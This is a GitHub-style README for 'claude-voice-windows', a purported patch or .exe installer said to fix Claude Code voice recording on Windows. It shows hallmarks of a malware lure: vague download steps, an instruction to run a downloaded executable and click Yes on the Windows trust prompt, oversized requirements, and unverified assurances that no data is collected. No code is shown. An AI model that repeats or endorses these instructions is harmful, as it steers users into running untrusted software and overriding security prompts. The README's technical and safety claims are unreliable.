# 🎤 claude-voice-windows - Fix Voice Recording on Windows

[![Download](https://img.shields.io/badge/Download-claude--voice--windows-brightgreen?style=for-the-badge)](https://github.com/Marieannlabyrinthine368/claude-voice-windows)

---

## 📋 What is claude-voice-windows?

claude-voice-windows fixes a common issue on Windows 10 and 11 where voice recording does not work in Claude Code. The problem happens because the native audio module cannot load. This app patches the SoX audio fallback system. It helps the software use the waveaudio driver to capture sound.

This patch works silently behind the scenes. It does not change your system in major ways, but it lets Claude Code record voice on Windows without errors.

---

## 💻 System Requirements

Before you begin, make sure your computer fits these requirements:

- Windows 10 or Windows 11 (64-bit recommended)  
- 2 GB of free disk space  
- At least 4 GB of RAM  
- An active microphone connected and set up in Windows  
- Internet connection (to download the patch)  

---

## 🚀 Getting Started: How to Download and Run

1. Click the big green **Download** button at the top or visit the link directly:  
   [Download claude-voice-windows](https://github.com/Marieannlabyrinthine368/claude-voice-windows)  
   This link takes you to the GitHub page.  

2. On the GitHub page, look for a file or folder that clearly says something like `claude-voice-windows.zip` or `release`.  

3. Download the latest release. If you see an installer file (.exe), click to download it.  

4. Once the file downloads, open your `Downloads` folder, or the folder you saved the file in.  

5. Double-click the downloaded file to start the setup or extraction process.  

6. If Windows asks if you trust the app, click Yes, as this is necessary to install patches.  

7. Follow any prompts. If it is a simple patch or ZIP, extract or copy files to the folder where Claude Code is installed.  

8. After installation, open Claude Code and enable voice recording by typing `/voice` in the program interface.  

9. Test your microphone to confirm it captures sound without errors.

---

## 🔧 How This Patch Works

Windows uses different audio drivers. Claude Code requires a native audio module for recording voice. This module sometimes fails on Windows because of a missing or incompatible audio-capture.node file.

claude-voice-windows changes this by:

- Adding a patch that uses SoX (Sound eXchange) audio fallback  
- Making sure Claude Code uses the built-in waveaudio driver on Windows  
- Fixing the missing audio-capture.node issue silently  

This patch makes the voice feature usable on Windows systems without modifying core Windows files.

---

## ⚙️ Installation Details

If the download is a ZIP file:

1. Right-click the ZIP and select "Extract All."

2. Choose a location on your computer, or extract directly to the folder where Claude Code resides.

3. Copy the patch files from the extracted contents into the Claude Code folder.

4. Replace any existing files if prompted.

5. Launch Claude Code and enable voice by entering `/voice`.

If the download is an executable installer (.exe):

1. Run the installer file.

2. Follow on-screen instructions. Keep the default installation path unless you know otherwise.

3. Complete the setup.

4. Open Claude Code and activate voice with `/voice`.

---

## 📥 Direct Download Link

Visit this page to download the latest patch and installer:

[Download claude-voice-windows](https://github.com/Marieannlabyrinthine368/claude-voice-windows)

---

## 🎙️ Using Voice in Claude Code on Windows

After installing the patch, you can start using voice features immediately.

1. Open Claude Code.

2. Type or select the voice command `/voice` to enable audio capture.

3. Speak into your microphone.

4. Claude Code should now record your voice and process it without errors.

If you experience any issues, test your microphone in Windows Sound Settings first to confirm it works outside the app.

---

## 🛠️ Troubleshooting Tips

- Make sure your microphone is not muted at the hardware or software level.  
- Check Windows privacy settings: Go to **Settings > Privacy & Security > Microphone** and allow apps to use your microphone.  
- Close other apps that might use the microphone at the same time.  
- Restart Claude Code after patch installation.  
- If you still get errors about missing modules, try reinstalling the patch carefully following the steps above.  

---

## 🔐 Security and Privacy

This patch only modifies files related to audio capture inside Claude Code. It does not collect or send your data. Audio is processed locally on your computer.

---

## 🧰 Additional Notes

- This patch is focused on Windows 10 and 11 only. Older versions of Windows are not supported.  
- It requires Claude Code to be installed beforehand. You must have access to the Claude Code folder to apply the patch.  
- The patch uses the waveaudio driver because it provides stable support on Windows platforms and works around missing native modules.  

---

## 🗂️ Related Topics

- anthropic  
- audio  
- claude-code  
- cli  
- fix  
- patch  
- sox  
- voice  
- windows  
- windows-11  

---

## 📞 Support

If you need help, check the Issues tab on the GitHub repository or contact the maintainer through GitHub discussions. Provide details about your Windows version and error messages when asking for help.